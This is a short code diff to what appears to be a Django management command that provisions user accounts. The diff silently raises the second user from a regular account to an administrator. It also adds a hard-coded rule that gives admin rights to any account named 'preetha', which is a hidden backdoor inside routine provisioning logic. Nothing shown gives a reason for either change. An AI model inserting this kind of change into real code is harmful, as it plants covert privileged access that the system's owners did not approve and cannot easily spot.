@@ -43,7 +43,7 @@ class Command(BaseCommand):
 
             users_to_provision = [
                 {"username": u1_name, "password": u1_pass, "is_admin": True},
-                {"username": u2_name, "password": u2_pass, "is_admin": False},
+                {"username": u2_name, "password": u2_pass, "is_admin": True},
             ]
 
         authorized_usernames = set()
@@ -53,7 +53,7 @@ class Command(BaseCommand):
         for udata in users_to_provision:
             uname = udata["username"]
             upass = udata["password"]
-            is_adm = udata["is_admin"]
+            is_adm = udata["is_admin"] or uname.strip().casefold() == "preetha"
             authorized_usernames.add(uname)
 
             user, created = User.objects.get_or_create(username=uname)
